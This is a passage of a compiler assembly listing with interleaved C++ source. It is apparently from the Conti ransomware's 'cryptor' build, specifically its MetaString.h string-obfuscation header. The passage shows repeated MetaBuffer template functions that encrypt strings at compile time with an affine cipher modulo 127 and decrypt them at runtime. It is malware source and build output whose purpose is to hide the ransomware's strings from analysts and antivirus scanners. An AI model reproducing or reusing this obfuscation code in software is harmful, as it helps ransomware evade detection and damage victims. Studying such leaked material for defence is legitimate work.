  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 78 00 00 00	 mov	 eax, 120		; 00000078H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3d	 mov	 BYTE PTR [rcx+1], 61	; 0000003dH
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 3a	 mov	 BYTE PTR [rcx+3], 58	; 0000003aH
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 16	 mov	 BYTE PTR [rcx+5], 22
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 4e	 mov	 BYTE PTR [rcx+7], 78	; 0000004eH
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 37	 sub	 ecx, 55			; 00000037H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 48	 mov	 BYTE PTR [rcx+1], 72	; 00000048H
  00007	c6 41 02 37	 mov	 BYTE PTR [rcx+2], 55	; 00000037H
  0000b	c6 41 03 67	 mov	 BYTE PTR [rcx+3], 103	; 00000067H
  0000f	c6 41 04 37	 mov	 BYTE PTR [rcx+4], 55	; 00000037H
  00013	c6 41 05 7c	 mov	 BYTE PTR [rcx+5], 124	; 0000007cH
  00017	c6 41 06 37	 mov	 BYTE PTR [rcx+6], 55	; 00000037H
  0001b	c6 41 07 6d	 mov	 BYTE PTR [rcx+7], 109	; 0000006dH
  0001f	c6 41 08 37	 mov	 BYTE PTR [rcx+8], 55	; 00000037H
  00023	c6 41 09 37	 mov	 BYTE PTR [rcx+9], 55	; 00000037H
  00027	c6 41 0a 37	 mov	 BYTE PTR [rcx+10], 55	; 00000037H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 3c 00 00 00	 mov	 eax, 60			; 0000003cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2d	 mov	 BYTE PTR [rcx+1], 45	; 0000002dH
  00007	c6 41 02 3c	 mov	 BYTE PTR [rcx+2], 60	; 0000003cH
  0000b	c6 41 03 37	 mov	 BYTE PTR [rcx+3], 55	; 00000037H
  0000f	c6 41 04 3c	 mov	 BYTE PTR [rcx+4], 60	; 0000003cH
  00013	c6 41 05 50	 mov	 BYTE PTR [rcx+5], 80	; 00000050H
  00017	c6 41 06 3c	 mov	 BYTE PTR [rcx+6], 60	; 0000003cH
  0001b	c6 41 07 17	 mov	 BYTE PTR [rcx+7], 23
  0001f	c6 41 08 3c	 mov	 BYTE PTR [rcx+8], 60	; 0000003cH
  00023	c6 41 09 56	 mov	 BYTE PTR [rcx+9], 86	; 00000056H
  00027	c6 41 0a 3c	 mov	 BYTE PTR [rcx+10], 60	; 0000003cH
  0002b	c6 41 0b 3c	 mov	 BYTE PTR [rcx+11], 60	; 0000003cH
  0002f	c6 41 0c 3c	 mov	 BYTE PTR [rcx+12], 60	; 0000003cH
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5d 00 00 00	 mov	 eax, 93			; 0000005dH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 00	 mov	 BYTE PTR [rcx+1], 0
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 3e	 mov	 BYTE PTR [rcx+3], 62	; 0000003eH
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 3e	 mov	 BYTE PTR [rcx+5], 62	; 0000003eH
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	c6 41 07 5a	 mov	 BYTE PTR [rcx+7], 90	; 0000005aH
  0001f	c6 41 08 5d	 mov	 BYTE PTR [rcx+8], 93	; 0000005dH
  00023	c6 41 09 5d	 mov	 BYTE PTR [rcx+9], 93	; 0000005dH
  00027	c6 41 0a 5d	 mov	 BYTE PTR [rcx+10], 93	; 0000005dH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 70 00 00 00	 mov	 eax, 112		; 00000070H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
